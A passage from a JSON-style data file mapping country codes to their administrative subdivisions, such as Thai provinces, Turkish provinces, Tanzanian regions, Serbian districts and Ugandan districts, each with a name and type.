      ""name"": ""Suceava"",
      ""type"": ""state""
    },
    ""TR"": {
      ""name"": ""Teleorman"",
      ""type"": ""state""
    },
    ""TM"": {
      ""name"": ""Timi\u0219"",
      ""type"": ""state""
    },
    ""TL"": {
      ""name"": ""Tulcea"",
      ""type"": ""state""
    },
    ""VL"": {
      ""name"": ""V\u00e2lcea"",
      ""type"": ""state""
    },
    ""VS"": {
      ""name"": ""Vaslui"",
      ""type"": ""state""
    },
    ""VN"": {
      ""name"": ""Vrancea"",
      ""type"": ""state""
    },
  },
  ""SG"": {},
  ""SK"": {},
  ""SI"": {},
  ""TH"": {
    ""TH-37"": {
      ""name"": ""Amnat Charoen"",
      ""type"": ""state""
    },
    ""TH-15"": {
      ""name"": ""Ang Thong"",
      ""type"": ""state""
    },
    ""TH-14"": {
      ""name"": ""Ayutthaya"",
      ""type"": ""state""
    },
    ""TH-10"": {
      ""name"": ""Bangkok"",
      ""type"": ""state""
    },
    ""TH-38"": {
      ""name"": ""Bueng Kan"",
      ""type"": ""state""
    },
    ""TH-31"": {
      ""name"": ""Buri Ram"",
      ""type"": ""state""
    },
    ""TH-24"": {
      ""name"": ""Chachoengsao"",
      ""type"": ""state""
    },
    ""TH-18"": {
      ""name"": ""Chai Nat"",
      ""type"": ""state""
    },
    ""TH-36"": {
      ""name"": ""Chaiyaphum"",
      ""type"": ""state""
    },
    ""TH-22"": {
      ""name"": ""Chanthaburi"",
      ""type"": ""state""
    },
    ""TH-50"": {
      ""name"": ""Chiang Mai"",
      ""type"": ""state""
    },
    ""TH-57"": {
      ""name"": ""Chiang Rai"",
      ""type"": ""state""
    },
    ""TH-20"": {
      ""name"": ""Chonburi"",
      ""type"": ""state""
    },
    ""TH-86"": {
      ""name"": ""Chumphon"",
      ""type"": ""state""
    },
    ""TH-46"": {
      ""name"": ""Kalasin"",
      ""type"": ""state""
    },
    ""TH-62"": {
      ""name"": ""Kamphaeng Phet"",
      ""type"": ""state""
    },
    ""TH-71"": {
      ""name"": ""Kanchanaburi"",
      ""type"": ""state""
    },
    ""TH-40"": {
      ""name"": ""Khon Kaen"",
      ""type"": ""state""
    },
    ""TH-81"": {
      ""name"": ""Krabi"",
      ""type"": ""state""
    },
    ""TH-52"": {
      ""name"": ""Lampang"",
      ""type"": ""state""
    },
    ""TH-51"": {
      ""name"": ""Lamphun"",
      ""type"": ""state""
    },
    ""TH-42"": {
      ""name"": ""Loei"",
      ""type"": ""state""
    },
    ""TH-16"": {
      ""name"": ""Lopburi"",
      ""type"": ""state""
    },
    ""TH-58"": {
      ""name"": ""Mae Hong Son"",
      ""type"": ""state""
    },
    ""TH-44"": {
      ""name"": ""Maha Sarakham"",
      ""type"": ""state""
    },
    ""TH-49"": {
      ""name"": ""Mukdahan"",
      ""type"": ""state""
    },
    ""TH-26"": {
      ""name"": ""Nakhon Nayok"",
      ""type"": ""state""
    },
    ""TH-73"": {
      ""name"": ""Nakhon Pathom"",
      ""type"": ""state""
    },
    ""TH-48"": {
      ""name"": ""Nakhon Phanom"",
      ""type"": ""state""
    },
    ""TH-30"": {
      ""name"": ""Nakhon Ratchasima"",
      ""type"": ""state""
    },
    ""TH-60"": {
      ""name"": ""Nakhon Sawan"",
      ""type"": ""state""
    },
    ""TH-80"": {
      ""name"": ""Nakhon Si Thammarat"",
      ""type"": ""state""
    },
    ""TH-55"": {
      ""name"": ""Nan"",
      ""type"": ""state""
    },
    ""TH-96"": {
      ""name"": ""Narathiwat"",
      ""type"": ""state""
    },
    ""TH-39"": {
      ""name"": ""Nong Bua Lam Phu"",
      ""type"": ""state""
    },
    ""TH-43"": {
      ""name"": ""Nong Khai"",
      ""type"": ""state""
    },
    ""TH-12"": {
      ""name"": ""Nonthaburi"",
      ""type"": ""state""
    },
    ""TH-13"": {
      ""name"": ""Pathum Thani"",
      ""type"": ""state""
    },
    ""TH-94"": {
      ""name"": ""Pattani"",
      ""type"": ""state""
    },
    ""TH-82"": {
      ""name"": ""Phang Nga"",
      ""type"": ""state""
    },
    ""TH-93"": {
      ""name"": ""Phatthalung"",
      ""type"": ""state""
    },
    ""TH-56"": {
      ""name"": ""Phayao"",
      ""type"": ""state""
    },
    ""TH-67"": {
      ""name"": ""Phetchabun"",
      ""type"": ""state""
    },
    ""TH-76"": {
      ""name"": ""Phetchaburi"",
      ""type"": ""state""
    },
    ""TH-66"": {
      ""name"": ""Phichit"",
      ""type"": ""state""
    },
    ""TH-65"": {
      ""name"": ""Phitsanulok"",
      ""type"": ""state""
    },
    ""TH-54"": {
      ""name"": ""Phrae"",
      ""type"": ""state""
    },
    ""TH-83"": {
      ""name"": ""Phuket"",
      ""type"": ""state""
    },
    ""TH-25"": {
      ""name"": ""Prachin Buri"",
      ""type"": ""state""
    },
    ""TH-77"": {
      ""name"": ""Prachuap Khiri Khan"",
      ""type"": ""state""
    },
    ""TH-85"": {
      ""name"": ""Ranong"",
      ""type"": ""state""
    },
    ""TH-70"": {
      ""name"": ""Ratchaburi"",
      ""type"": ""state""
    },
    ""TH-21"": {
      ""name"": ""Rayong"",
      ""type"": ""state""
    },
    ""TH-45"": {
      ""name"": ""Roi Et"",
      ""type"": ""state""
    },
    ""TH-27"": {
      ""name"": ""Sa Kaeo"",
      ""type"": ""state""
    },
    ""TH-47"": {
      ""name"": ""Sakon Nakhon"",
      ""type"": ""state""
    },
    ""TH-11"": {
      ""name"": ""Samut Prakan"",
      ""type"": ""state""
    },
    ""TH-74"": {
      ""name"": ""Samut Sakhon"",
      ""type"": ""state""
    },
    ""TH-75"": {
      ""name"": ""Samut Songkhram"",
      ""type"": ""state""
    },
    ""TH-19"": {
      ""name"": ""Saraburi"",
      ""type"": ""state""
    },
    ""TH-91"": {
      ""name"": ""Satun"",
      ""type"": ""state""
    },
    ""TH-17"": {
      ""name"": ""Sing Buri"",
      ""type"": ""state""
    },
    ""TH-33"": {
      ""name"": ""Sisaket"",
      ""type"": ""state""
    },
    ""TH-90"": {
      ""name"": ""Songkhla"",
      ""type"": ""state""
    },
    ""TH-64"": {
      ""name"": ""Sukhothai"",
      ""type"": ""state""
    },
    ""TH-72"": {
      ""name"": ""Suphan Buri"",
      ""type"": ""state""
    },
    ""TH-84"": {
      ""name"": ""Surat Thani"",
      ""type"": ""state""
    },
    ""TH-32"": {
      ""name"": ""Surin"",
      ""type"": ""state""
    },
    ""TH-63"": {
      ""name"": ""Tak"",
      ""type"": ""state""
    },
    ""TH-92"": {
      ""name"": ""Trang"",
      ""type"": ""state""
    },
    ""TH-23"": {
      ""name"": ""Trat"",
      ""type"": ""state""
    },
    ""TH-34"": {
      ""name"": ""Ubon Ratchathani"",
      ""type"": ""state""
    },
    ""TH-41"": {
      ""name"": ""Udon Thani"",
      ""type"": ""state""
    },
    ""TH-61"": {
      ""name"": ""Uthai Thani"",
      ""type"": ""state""
    },
    ""TH-53"": {
      ""name"": ""Uttaradit"",
      ""type"": ""state""
    },
    ""TH-95"": {
      ""name"": ""Yala"",
      ""type"": ""state""
    },
    ""TH-35"": {
      ""name"": ""Yasothon"",
      ""type"": ""state""
    },
  },
  ""TR"": {
    ""TR01"": {
      ""name"": ""Adana"",
      ""type"": ""state""
    },
    ""TR02"": {
      ""name"": ""Ad\u0131yaman"",
      ""type"": ""state""
    },
    ""TR03"": {
      ""name"": ""Afyon"",
      ""type"": ""state""
    },
    ""TR04"": {
      ""name"": ""A\u011fr\u0131"",
      ""type"": ""state""
    },
    ""TR05"": {
      ""name"": ""Amasya"",
      ""type"": ""state""
    },
    ""TR06"": {
      ""name"": ""Ankara"",
      ""type"": ""state""
    },
    ""TR07"": {
      ""name"": ""Antalya"",
      ""type"": ""state""
    },
    ""TR08"": {
      ""name"": ""Artvin"",
      ""type"": ""state""
    },
    ""TR09"": {
      ""name"": ""Ayd\u0131n"",
      ""type"": ""state""
    },
    ""TR10"": {
      ""name"": ""Bal\u0131kesir"",
      ""type"": ""state""
    },
    ""TR11"": {
      ""name"": ""Bilecik"",
      ""type"": ""state""
    },
    ""TR12"": {
      ""name"": ""Bing\u00f6l"",
      ""type"": ""state""
    },
    ""TR13"": {
      ""name"": ""Bitlis"",
      ""type"": ""state""
    },
    ""TR14"": {
      ""name"": ""Bolu"",
      ""type"": ""state""
    },
    ""TR15"": {
      ""name"": ""Burdur"",
      ""type"": ""state""
    },
    ""TR16"": {
      ""name"": ""Bursa"",
      ""type"": ""state""
    },
    ""TR17"": {
      ""name"": ""\u00c7anakkale"",
      ""type"": ""state""
    },
    ""TR18"": {
      ""name"": ""\u00c7ank\u0131r\u0131"",
      ""type"": ""state""
    },
    ""TR19"": {
      ""name"": ""\u00c7orum"",
      ""type"": ""state""
    },
    ""TR20"": {
      ""name"": ""Denizli"",
      ""type"": ""state""
    },
    ""TR21"": {
      ""name"": ""Diyarbak\u0131r"",
      ""type"": ""state""
    },
    ""TR22"": {
      ""name"": ""Edirne"",
      ""type"": ""state""
    },
    ""TR23"": {
      ""name"": ""Elaz\u0131\u011f"",
      ""type"": ""state""
    },
    ""TR24"": {
      ""name"": ""Erzincan"",
      ""type"": ""state""
    },
    ""TR25"": {
      ""name"": ""Erzurum"",
      ""type"": ""state""
    },
    ""TR26"": {
      ""name"": ""Eski\u015fehir"",
      ""type"": ""state""
    },
    ""TR27"": {
      ""name"": ""Gaziantep"",
      ""type"": ""state""
    },
    ""TR28"": {
      ""name"": ""Giresun"",
      ""type"": ""state""
    },
    ""TR29"": {
      ""name"": ""G\u00fcm\u00fc\u015fhane"",
      ""type"": ""state""
    },
    ""TR30"": {
      ""name"": ""Hakkari"",
      ""type"": ""state""
    },
    ""TR31"": {
      ""name"": ""Hatay"",
      ""type"": ""state""
    },
    ""TR32"": {
      ""name"": ""Isparta"",
      ""type"": ""state""
    },
    ""TR33"": {
      ""name"": ""\u0130\u00e7el"",
      ""type"": ""state""
    },
    ""TR34"": {
      ""name"": ""\u0130stanbul"",
      ""type"": ""state""
    },
    ""TR35"": {
      ""name"": ""\u0130zmir"",
      ""type"": ""state""
    },
    ""TR36"": {
      ""name"": ""Kars"",
      ""type"": ""state""
    },
    ""TR37"": {
      ""name"": ""Kastamonu"",
      ""type"": ""state""
    },
    ""TR38"": {
      ""name"": ""Kayseri"",
      ""type"": ""state""
    },
    ""TR39"": {
      ""name"": ""K\u0131rklareli"",
      ""type"": ""state""
    },
    ""TR40"": {
      ""name"": ""K\u0131r\u015fehir"",
      ""type"": ""state""
    },
    ""TR41"": {
      ""name"": ""Kocaeli"",
      ""type"": ""state""
    },
    ""TR42"": {
      ""name"": ""Konya"",
      ""type"": ""state""
    },
    ""TR43"": {
      ""name"": ""K\u00fctahya"",
      ""type"": ""state""
    },
    ""TR44"": {
      ""name"": ""Malatya"",
      ""type"": ""state""
    },
    ""TR45"": {
      ""name"": ""Manisa"",
      ""type"": ""state""
    },
    ""TR46"": {
      ""name"": ""Kahramanmara\u015f"",
      ""type"": ""state""
    },
    ""TR47"": {
      ""name"": ""Mardin"",
      ""type"": ""state""
    },
    ""TR48"": {
      ""name"": ""Mu\u011fla"",
      ""type"": ""state""
    },
    ""TR49"": {
      ""name"": ""Mu\u015f"",
      ""type"": ""state""
    },
    ""TR50"": {
      ""name"": ""Nev\u015fehir"",
      ""type"": ""state""
    },
    ""TR51"": {
      ""name"": ""Ni\u011fde"",
      ""type"": ""state""
    },
    ""TR52"": {
      ""name"": ""Ordu"",
      ""type"": ""state""
    },
    ""TR53"": {
      ""name"": ""Rize"",
      ""type"": ""state""
    },
    ""TR54"": {
      ""name"": ""Sakarya"",
      ""type"": ""state""
    },
    ""TR55"": {
      ""name"": ""Samsun"",
      ""type"": ""state""
    },
    ""TR56"": {
      ""name"": ""Siirt"",
      ""type"": ""state""
    },
    ""TR57"": {
      ""name"": ""Sinop"",
      ""type"": ""state""
    },
    ""TR58"": {
      ""name"": ""Sivas"",
      ""type"": ""state""
    },
    ""TR59"": {
      ""name"": ""Tekirda\u011f"",
      ""type"": ""state""
    },
    ""TR60"": {
      ""name"": ""Tokat"",
      ""type"": ""state""
    },
    ""TR61"": {
      ""name"": ""Trabzon"",
      ""type"": ""state""
    },
    ""TR62"": {
      ""name"": ""Tunceli"",
      ""type"": ""state""
    },
    ""TR63"": {
      ""name"": ""\u015eanl\u0131urfa"",
      ""type"": ""state""
    },
    ""TR64"": {
      ""name"": ""U\u015fak"",
      ""type"": ""state""
    },
    ""TR65"": {
      ""name"": ""Van"",
      ""type"": ""state""
    },
    ""TR66"": {
      ""name"": ""Yozgat"",
      ""type"": ""state""
    },
    ""TR67"": {
      ""name"": ""Zonguldak"",
      ""type"": ""state""
    },
    ""TR68"": {
      ""name"": ""Aksaray"",
      ""type"": ""state""
    },
    ""TR69"": {
      ""name"": ""Bayburt"",
      ""type"": ""state""
    },
    ""TR70"": {
      ""name"": ""Karaman"",
      ""type"": ""state""
    },
    ""TR71"": {
      ""name"": ""K\u0131r\u0131kkale"",
      ""type"": ""state""
    },
    ""TR72"": {
      ""name"": ""Batman"",
      ""type"": ""state""
    },
    ""TR73"": {
      ""name"": ""\u015e\u0131rnak"",
      ""type"": ""state""
    },
    ""TR74"": {
      ""name"": ""Bart\u0131n"",
      ""type"": ""state""
    },
    ""TR75"": {
      ""name"": ""Ardahan"",
      ""type"": ""state""
    },
    ""TR76"": {
      ""name"": ""I\u011fd\u0131r"",
      ""type"": ""state""
    },
    ""TR77"": {
      ""name"": ""Yalova"",
      ""type"": ""state""
    },
    ""TR78"": {
      ""name"": ""Karab\u00fck"",
      ""type"": ""state""
    },
    ""TR79"": {
      ""name"": ""Kilis"",
      ""type"": ""state""
    },
    ""TR80"": {
      ""name"": ""Osmaniye"",
      ""type"": ""state""
    },
    ""TR81"": {
      ""name"": ""D\u00fczce"",
      ""type"": ""state""
    },
  },
  ""TZ"": {
    ""TZ01"": {
      ""name"": ""Arusha"",
      ""type"": ""state""
    },
    ""TZ02"": {
      ""name"": ""Dar es Salaam"",
      ""type"": ""state""
    },
    ""TZ03"": {
      ""name"": ""Dodoma"",
      ""type"": ""state""
    },
    ""TZ04"": {
      ""name"": ""Iringa"",
      ""type"": ""state""
    },
    ""TZ05"": {
      ""name"": ""Kagera"",
      ""type"": ""state""
    },
    ""TZ06"": {
      ""name"": ""Pemba North"",
      ""type"": ""state""
    },
    ""TZ07"": {
      ""name"": ""Zanzibar North"",
      ""type"": ""state""
    },
    ""TZ08"": {
      ""name"": ""Kigoma"",
      ""type"": ""state""
    },
    ""TZ09"": {
      ""name"": ""Kilimanjaro"",
      ""type"": ""state""
    },
    ""TZ10"": {
      ""name"": ""Pemba South"",
      ""type"": ""state""
    },
    ""TZ11"": {
      ""name"": ""Zanzibar South"",
      ""type"": ""state""
    },
    ""TZ12"": {
      ""name"": ""Lindi"",
      ""type"": ""state""
    },
    ""TZ13"": {
      ""name"": ""Mara"",
      ""type"": ""state""
    },
    ""TZ14"": {
      ""name"": ""Mbeya"",
      ""type"": ""state""
    },
    ""TZ15"": {
      ""name"": ""Zanzibar West"",
      ""type"": ""state""
    },
    ""TZ16"": {
      ""name"": ""Morogoro"",
      ""type"": ""state""
    },
    ""TZ17"": {
      ""name"": ""Mtwara"",
      ""type"": ""state""
    },
    ""TZ18"": {
      ""name"": ""Mwanza"",
      ""type"": ""state""
    },
    ""TZ19"": {
      ""name"": ""Coast"",
      ""type"": ""state""
    },
    ""TZ20"": {
      ""name"": ""Rukwa"",
      ""type"": ""state""
    },
    ""TZ21"": {
      ""name"": ""Ruvuma"",
      ""type"": ""state""
    },
    ""TZ22"": {
      ""name"": ""Shinyanga"",
      ""type"": ""state""
    },
    ""TZ23"": {
      ""name"": ""Singida"",
      ""type"": ""state""
    },
    ""TZ24"": {
      ""name"": ""Tabora"",
      ""type"": ""state""
    },
    ""TZ25"": {
      ""name"": ""Tanga"",
      ""type"": ""state""
    },
    ""TZ26"": {
      ""name"": ""Manyara"",
      ""type"": ""state""
    },
    ""TZ27"": {
      ""name"": ""Geita"",
      ""type"": ""state""
    },
    ""TZ28"": {
      ""name"": ""Katavi"",
      ""type"": ""state""
    },
    ""TZ29"": {
      ""name"": ""Njombe"",
      ""type"": ""state""
    },
    ""TZ30"": {
      ""name"": ""Simiyu"",
      ""type"": ""state""
    },
  },
  ""LK"": {},
  ""RS"": {
    ""RS00"": {
      ""name"": ""Belgrade"",
      ""type"": ""district""
    },
    ""RS14"": {
      ""name"": ""Bor"",
      ""type"": ""district""
    },
    ""RS11"": {
      ""name"": ""Brani\u010devo"",
      ""type"": ""district""
    },
    ""RS02"": {
      ""name"": ""Central Banat"",
      ""type"": ""district""
    },
    ""RS10"": {
      ""name"": ""Danube"",
      ""type"": ""district""
    },
    ""RS23"": {
      ""name"": ""Jablanica"",
      ""type"": ""district""
    },
    ""RS09"": {
      ""name"": ""Kolubara"",
      ""type"": ""district""
    },
    ""RS08"": {
      ""name"": ""Ma\u010dva"",
      ""type"": ""district""
    },
    ""RS17"": {
      ""name"": ""Morava"",
      ""type"": ""district""
    },
    ""RS20"": {
      ""name"": ""Ni\u0161ava"",
      ""type"": ""district""
    },
    ""RS01"": {
      ""name"": ""North Ba\u010dka"",
      ""type"": ""district""
    },
    ""RS03"": {
      ""name"": ""North Banat"",
      ""type"": ""district""
    },
    ""RS24"": {
      ""name"": ""P\u010dinja"",
      ""type"": ""district""
    },
    ""RS22"": {
      ""name"": ""Pirot"",
      ""type"": ""district""
    },
    ""RS13"": {
      ""name"": ""Pomoravlje"",
      ""type"": ""district""
    },
    ""RS19"": {
      ""name"": ""Rasina"",
      ""type"": ""district""
    },
    ""RS18"": {
      ""name"": ""Ra\u0161ka"",
      ""type"": ""district""
    },
    ""RS06"": {
      ""name"": ""South Ba\u010dka"",
      ""type"": ""district""
    },
    ""RS04"": {
      ""name"": ""South Banat"",
      ""type"": ""district""
    },
    ""RS07"": {
      ""name"": ""Srem"",
      ""type"": ""district""
    },
    ""RS12"": {
      ""name"": ""\u0160umadija"",
      ""type"": ""district""
    },
    ""RS21"": {
      ""name"": ""Toplica"",
      ""type"": ""district""
    },
    ""RS05"": {
      ""name"": ""West Ba\u010dka"",
      ""type"": ""district""
    },
    ""RS15"": {
      ""name"": ""Zaje\u010dar"",
      ""type"": ""district""
    },
    ""RS16"": {
      ""name"": ""Zlatibor"",
      ""type"": ""district""
    },
    ""RS25"": {
      ""name"": ""Kosovo"",
      ""type"": ""district""
    },
    ""RS26"": {
      ""name"": ""Pe\u0107"",
      ""type"": ""district""
    },
    ""RS27"": {
      ""name"": ""Prizren"",
      ""type"": ""district""
    },
    ""RS28"": {
      ""name"": ""Kosovska Mitrovica"",
      ""type"": ""district""
    },
    ""RS29"": {
      ""name"": ""Kosovo-Pomoravlje"",
      ""type"": ""district""
    },
    ""RSKM"": {
      ""name"": ""Kosovo-Metohija"",
      ""type"": ""district""
    },
    ""RSVO"": {
      ""name"": ""Vojvodina"",
      ""type"": ""district""
    },
  },
  ""SE"": {},
  ""UG"": {
    ""UG314"": {
      ""name"": ""Abim"",
      ""type"": ""state""
    },
    ""UG301"": {
      ""name"": ""Adjumani"",
      ""type"": ""state""
    },
    ""UG322"": {
      ""name"": ""Agago"",
      ""type"": ""state""
    },
    ""UG323"": {
      ""name"": ""Alebtong"",
      ""type"": ""state""
    },
    ""UG315"": {
      ""name"": ""Amolatar"",
      ""type"": ""state""
    },
    ""UG324"": {
      ""name"": ""Amudat"",
      ""type"": ""state""
    },
    ""UG216"": {
      ""name"": ""Amuria"",
      ""type"": ""state""
    },
    ""UG316"": {
      ""name"": ""Amuru"",
      ""type"": ""state""
    },
    ""UG302"": {
      ""name"": ""Apac"",
      ""type"": ""state""
    },
    ""UG303"": {
      ""name"": ""Arua"",
      ""type"": ""state""
    },
    ""UG217"": {
      ""name"": ""Budaka"",
      ""type"": ""state""
    },
    ""UG218"": {
      ""name"": ""Bududa"",
      ""type"": ""state""
    },
    ""UG201"": {
      ""name"": ""Bugiri"",
      ""type"": ""state""
    },
    ""UG235"": {
      ""name"": ""Bugweri"",
      ""type"": ""state""
    },
    ""UG420"": {
      ""name"": ""Buhweju"",
      ""type"": ""state""
    },
    ""UG117"": {
      ""name"": ""Buikwe"",
      ""type"": ""state""
    },
    ""UG219"": {
      ""name"": ""Bukedea"",
      ""type"": ""state""
    },
    ""UG118"": {
      ""name"": ""Bukomansimbi"",
      ""type"": ""state""
    },
    ""UG220"": {
      ""name"": ""Bukwa"",
      ""type"": ""state""
    },
    ""UG225"": {
      ""name"": ""Bulambuli"",
      ""type"": ""state""
    },
    ""UG416"": {
      ""name"": ""Buliisa"",
      ""type"": ""state""
    },
    ""UG401"": {
      ""name"": ""Bundibugyo"",
      ""type"": ""state""
    },
    ""UG430"": {
      ""name"": ""Bunyangabu"",
      ""type"": ""state""
    },
    ""UG402"": {
      ""name"": ""Bushenyi"",
      ""type"": ""state""
    },
    ""UG202"": {
      ""name"": ""Busia"",
      ""type"": ""state""
    },
    ""UG221"": {
      ""name"": ""Butaleja"",
      ""type"": ""state""
    },
    ""UG119"": {
      ""name"": ""Butambala"",
      ""type"": ""state""
    },
    ""UG233"": {
      ""name"": ""Butebo"",
      ""type"": ""state""
    },
    ""UG120"": {
      ""name"": ""Buvuma"",
      ""type"": ""state""
    },
    ""UG226"": {
      ""name"": ""Buyende"",
      ""type"": ""state""
    },
    ""UG317"": {
      ""name"": ""Dokolo"",
      ""type"": ""state""
    },
    ""UG121"": {
      ""name"": ""Gomba"",
      ""type"": ""state""
    },
    ""UG304"": {
      ""name"": ""Gulu"",
      ""type"": ""state""
    },
    ""UG403"": {
      ""name"": ""Hoima"",
      ""type"": ""state""
    },
    ""UG417"": {
      ""name"": ""Ibanda"",
      ""type"": ""state""
    },
    ""UG203"": {
      ""name"": ""Iganga"",
      ""type"": ""state""
    },
    ""UG418"": {
      ""name"": ""Isingiro"",
      ""type"": ""state""
    },
    ""UG204"": {
      ""name"": ""Jinja"",
      ""type"": ""state""
    },
    ""UG318"": {
      ""name"": ""Kaabong"",
      ""type"": ""state""
    },
    ""UG404"": {
      ""name"": ""Kabale"",
      ""type"": ""state""
    },
    ""UG405"": {
      ""name"": ""Kabarole"",
      ""type"": ""state""
    },
    ""UG213"": {
      ""name"": ""Kaberamaido"",
      ""type"": ""state""
    },
    ""UG427"": {
      ""name"": ""Kagadi"",
      ""type"": ""state""
    },
    ""UG428"": {
      ""name"": ""Kakumiro"",
      ""type"": ""state""
    },
    ""UG101"": {
      ""name"": ""Kalangala"",
      ""type"": ""state""
    },
    ""UG222"": {
      ""name"": ""Kaliro"",
      ""type"": ""state""
    },
    ""UG122"": {
      ""name"": ""Kalungu"",
      ""type"": ""state""
    },
    ""UG102"": {
      ""name"": ""Kampala"",
      ""type"": ""state""
    },
    ""UG205"": {
      ""name"": ""Kamuli"",
      ""type"": ""state""
    },
    ""UG413"": {
      ""name"": ""Kamwenge"",
      ""type"": ""state""
    },
    ""UG414"": {
      ""name"": ""Kanungu"",
      ""type"": ""state""
    },
    ""UG206"": {
      ""name"": ""Kapchorwa"",
      ""type"": ""state""
    },
    ""UG236"": {
      ""name"": ""Kapelebyong"",
      ""type"": ""state""
    },
    ""UG126"": {
      ""name"": ""Kasanda"",
      ""type"": ""state""
    },
    ""UG406"": {
      ""name"": ""Kasese"",
      ""type"": ""state""
    },
    ""UG207"": {
      ""name"": ""Katakwi"",
      ""type"": ""state""
    },
    ""UG112"": {
      ""name"": ""Kayunga"",
      ""type"": ""state""
    },
    ""UG407"": {
      ""name"": ""Kibaale"",
      ""type"": ""state""
    },
    ""UG103"": {
      ""name"": ""Kiboga"",
      ""type"": ""state""
    },
    ""UG227"": {
      ""name"": ""Kibuku"",
      ""type"": ""state""
    },
    ""UG432"": {
      ""name"": ""Kikuube"",
      ""type"": ""state""
    },
    ""UG419"": {
      ""name"": ""Kiruhura"",
      ""type"": ""state""
    },
    ""UG421"": {
      ""name"": ""Kiryandongo"",
      ""type"": ""state""
    },
    ""UG408"": {
      ""name"": ""Kisoro"",
      ""type"": ""state""
    },
    ""UG305"": {
      ""name"": ""Kitgum"",
      ""type"": ""state""
    },
    ""UG319"": {
      ""name"": ""Koboko"",
      ""type"": ""state""
    },
    ""UG325"": {
      ""name"": ""Kole"",
      ""type"": ""state""
    },
    ""UG306"": {
      ""name"": ""Kotido"",
      ""type"": ""state""
    },
    ""UG208"": {
      ""name"": ""Kumi"",
      ""type"": ""state""
    },
    ""UG333"": {
      ""name"": ""Kwania"",
      ""type"": ""state""
    },
    ""UG228"": {
      ""name"": ""Kween"",
      ""type"": ""state""
    },
    ""UG123"": {
      ""name"": ""Kyankwanzi"",
      ""type"": ""state""
    },
    ""UG422"": {
      ""name"": ""Kyegegwa"",
      ""type"": ""state""
    },
    ""UG415"": {
      ""name"": ""Kyenjojo"",
      ""type"": ""state""
    },
    ""UG125"": {
      ""name"": ""Kyotera"",
      ""type"": ""state""
    },
    ""UG326"": {
      ""name"": ""Lamwo"",
      ""type"": ""state""
    },
    ""UG307"": {
      ""name"": ""Lira"",
      ""type"": ""state""
    },
    ""UG229"": {
      ""name"": ""Luuka"",
      ""type"": ""state""
    },
    ""UG104"": {
      ""name"": ""Luwero"",
      ""type"": ""state""
    },
    ""UG124"": {
      ""name"": ""Lwengo"",
      ""type"": ""state""
    },
    ""UG114"": {
      ""name"": ""Lyantonde"",
      ""type"": ""state""
    },
    ""UG223"": {
      ""name"": ""Manafwa"",
      ""type"": ""state""
    },
    ""UG320"": {
      ""name"": ""Maracha"",
      ""type"": ""state""
    },
    ""UG105"": {
      ""name"": ""Masaka"",
      ""type"": ""state""
    },
    ""UG409"": {
      ""name"": ""Masindi"",
      ""type"": ""state""
    },
    ""UG214"": {
      ""name"": ""Mayuge"",
      ""type"": ""state""
    },
    ""UG209"": {
      ""name"": ""Mbale"",
      ""type"": ""state""
    },
    ""UG410"": {
      ""name"": ""Mbarara"",
      ""type"": ""state""
    },
    ""UG423"": {
      ""name"": ""Mitooma"",
      ""type"": ""state""
    },
    ""UG115"": {
      ""name"": ""Mityana"",
      ""type"": ""state""
    },
    ""UG308"": {
      ""name"": ""Moroto"",
      ""type"": ""state""
    },
    ""UG309"": {
      ""name"": ""Moyo"",
      ""type"": ""state""
    },
    ""UG106"": {
      ""name"": ""Mpigi"",
      ""type"": ""state""
    },
    ""UG107"": {
      ""name"": ""Mubende"",
      ""type"": ""state""
    },
    ""UG108"": {
      ""name"": ""Mukono"",
      ""type"": ""state""
    },
    ""UG334"": {
      ""name"": ""Nabilatuk"",
      ""type"": ""state""
    },
    ""UG311"": {
      ""name"": ""Nakapiripirit"",
      ""type"": ""state""
    },
    ""UG116"": {
      ""name"": ""Nakaseke"",
      ""type"": ""state""
    },
    ""UG109"": {
      ""name"": ""Nakasongola"",
      ""type"": ""state""
    },
    ""UG230"": {
      ""name"": ""Namayingo"",
      ""type"": ""state""
    },
    ""UG234"": {
      ""name"": ""Namisindwa"",
      ""type"": ""state""
    },
    ""UG224"": {
      ""name"": ""Namutumba"",
      ""type"": ""state""
    },
    ""UG327"": {
      ""name"": ""Napak"",
      ""type"": ""state""
    },
    ""UG310"": {
      ""name"": ""Nebbi"",
      ""type"": ""state""
    },
    ""UG231"": {
      ""name"": ""Ngora"",
      ""type"": ""state""
    },
    ""UG424"": {
      ""name"": ""Ntoroko"",
      ""type"": ""state""
    },
    ""UG411"": {
      ""name"": ""Ntungamo"",
      ""type"": ""state""
    },
    ""UG328"": {
      ""name"": ""Nwoya"",
      ""type"": ""state""
    },
    ""UG331"": {
      ""name"": ""Omoro"",
      ""type"": ""state""
    },
    ""UG329"": {
      ""name"": ""Otuke"",
      ""type"": ""state""
    },
    ""UG321"": {
      ""name"": ""Oyam"",
      ""type"": ""state""
    },
    ""UG312"": {
      ""name"": ""Pader"",
      ""type"": ""state""
    },
    ""UG332"": {
      ""name"": ""Pakwach"",
      ""type"": ""state""
    },
    ""UG210"": {
      ""name"": ""Pallisa"",
      ""type"": ""state""
    },
    ""UG110"": {
      ""name"": ""Rakai"",
      ""type"": ""state""
    },
    ""UG429"": {
      ""name"": ""Rubanda"",
      ""type"": ""state""
    },
    ""UG425"": {
      ""name"": ""Rubirizi"",
      ""type"": ""state""
    },
    ""UG431"": {
      ""name"": ""Rukiga"",
      ""type"": ""state""
    },
    ""UG412"": {
      ""name"": ""Rukungiri"",
      ""type"": ""state""
    },
    ""UG111"": {
      ""name"": ""Sembabule"",
      ""type"": ""state""
    },
    ""UG232"": {
      ""name"": ""Serere"",
      ""type"": ""state""
    },
    ""UG426"": {
      ""name"": ""Sheema"",
      ""type"": ""state""
    },
    ""UG215"": {
      ""name"": ""Sironko"",
      ""type"": ""state""
    },
    ""UG211"": {
      ""name"": ""Soroti"",
      ""type"": ""state""
    },
    ""UG212"": {
      ""name"": ""Tororo"",
      ""type"": ""state""
    },
    ""UG113"": {
      ""name"": ""Wakiso"",
      ""type"": ""state""
    },
    ""UG313"": {
      ""name"": ""Yumbe"",
      ""type"": ""state""
    },
    ""UG330"": {
      ""name"": ""Zombo"",
      ""type"": ""state""
    },
  },
  ""UM"": {
    ""81"": {
      ""name"": ""Baker Island"",
      ""type"": ""state""
    },
    ""84"": {
      ""name"": ""Howland Island"",
      ""type"": ""state""
    },
    ""86"": {
      ""name"": ""Jarvis Island"",
      ""type"": ""state""
    },
    ""67"": {
      ""name"": ""Johnston Atoll"",
      ""type"": ""state""
    },
    ""89"": {
      ""name"": ""Kingman Reef"",
      ""type"": ""state""
    },
    ""71"": {
      ""name"": ""Midway Atoll"",
      ""type"": ""state""
    },
    ""76"": {
      ""name"": ""Navassa Island"",
      ""type"": ""state""
    },
    ""95"": {
      ""name"": ""Palmyra Atoll"",
      ""type"": ""state""
    },
    ""79"": {
